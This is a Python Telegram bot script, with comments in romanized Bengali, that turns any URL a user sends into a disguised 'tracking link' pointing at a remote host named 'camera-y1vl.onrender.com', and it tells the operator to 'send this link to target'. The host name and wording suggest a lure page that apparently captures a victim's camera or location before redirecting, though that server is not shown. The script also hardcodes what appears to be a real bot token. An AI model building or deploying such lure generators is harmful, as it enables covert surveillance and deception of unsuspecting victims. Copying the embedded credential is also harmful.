import logging
import uuid
import base64
from telegram import Update
from telegram.ext import ApplicationBuilder, ContextTypes, MessageHandler, filters

logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)

RENDER_BASE_URL = "https://camera-y1vl.onrender.com"

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_text = update.message.text.strip()
    
    if user_text.lower() == "hello":
        await update.message.reply_text("hi")
    else:
        target_url = user_text
        
        # Link-e http/https na thakle jure dewa
        if not (target_url.startswith("http://") or target_url.startswith("https://")):
            target_url = "https://" + target_url

        # URL-ta-ke safe-vabe Base64-e encode kora
        encoded_url = base64.urlsafe_b64encode(target_url.encode()).decode()
        unique_id = str(uuid.uuid4())[:6]
        
        # Dynamic tracking link toiri kora
        tracking_link = f"{RENDER_BASE_URL}/?id={unique_id}&url={encoded_url}"
        
        response_msg = (
            f"🎯 **Target Tracking Link Created!**\n\n"
            f"🔗 Original Target: `{target_url}`\n\n"
            f"📤 Send this link to target:\n{tracking_link}"
        )
        await update.message.reply_text(response_msg, parse_mode="Markdown")

if __name__ == '__main__':
    BOT_TOKEN = "8836334469:AAE6WOWEabXtkgCWVaIHhpMgTwAEQ3KxLdY"

    application = ApplicationBuilder().token(BOT_TOKEN).build()

    message_handler = MessageHandler(filters.TEXT & (~filters.COMMAND), handle_message)
    application.add_handler(message_handler)

    print("Dynamic link bot is running...")
    application.run_polling()
